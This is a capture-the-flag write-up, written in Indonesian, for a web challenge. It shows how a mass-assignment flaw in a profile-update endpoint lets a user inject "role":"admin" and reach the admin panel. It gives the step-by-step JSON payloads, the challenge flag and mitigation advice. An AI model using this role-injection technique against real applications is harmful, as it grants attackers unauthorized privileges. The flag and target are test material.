# Writeup - A Massive Problem (Web Misc)

Challenge ini terlihat seperti aplikasi internal biasa: ada register, login, dashboard, profile, dan panel admin.
Deskripsi challenge bilang: *"Improper Authorization has been fixed!"*.
Dari judulnya (*A Massive Problem*), indikasi paling kuat adalah **mass assignment** masih ada.

## Informasi Target

- URL: `http://23.179.17.92:5556`
- Teknologi (dari header): `Werkzeug/3.1.8`, Python 3.12

## Ringkasan Vulnerability

Endpoint `POST /api/profile` menerima JSON profile update dari user biasa.
Aplikasi seharusnya hanya mengizinkan field aman seperti:
- `full_name`
- `title`
- `team`
- opsional `password`

Tapi backend ternyata masih menerima field sensitif `role`.
Akibatnya user biasa bisa kirim payload `{"role":"admin"}` dan naik privilege ke admin.

## Langkah Exploit

### 1. Register akun biasa

Kirim request ke:
- `POST /api/register`

Contoh payload:

```json
{
  "full_name": "Nata Test",
  "username": "natauser",
  "title": "Dev",
  "team": "Ops",
  "password": "Abcd1234!"
}
```

### 2. Login akun tersebut

Kirim request ke:
- `POST /api/login`

Contoh payload:

```json
{
  "username": "natauser",
  "password": "Abcd1234!"
}
```

### 3. Abuse mass assignment di profile update

Kirim request ke:
- `POST /api/profile`

Payload exploit:

```json
{
  "full_name": "Nata Test",
  "title": "Dev",
  "team": "Ops",
  "role": "admin"
}
```

Server merespon sukses (`200`) dan minta login ulang.

### 4. Login ulang, akses `/admin`

Setelah login ulang, dashboard menampilkan link Admin.
Akses `/admin` dan flag muncul langsung di halaman.

## Flag

```text
CIT{M@ss_@ssignm3nt_Pr1v3sc}
```

## Solver Otomatis

Saya simpan solver di file:
- `solve.py`

Jalankan dengan venv kamu:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Atau pakai URL lain:

```bash
python3 solve.py --url http://23.179.17.92:5556
```

## Kenapa ini terjadi?

Masalah inti: backend melakukan update model user dari body JSON tanpa allowlist field ketat.
Jadi field yang seharusnya internal (`role`) ikut ter-assign.

## Mitigasi yang benar

- Terapkan allowlist strict untuk field yang boleh diupdate user.
- Jangan pernah ambil `role` dari input user biasa.
- Pisahkan endpoint admin update privilege dari endpoint profile user.
- Tambah test keamanan: pastikan user standar tidak bisa mengubah role sendiri.
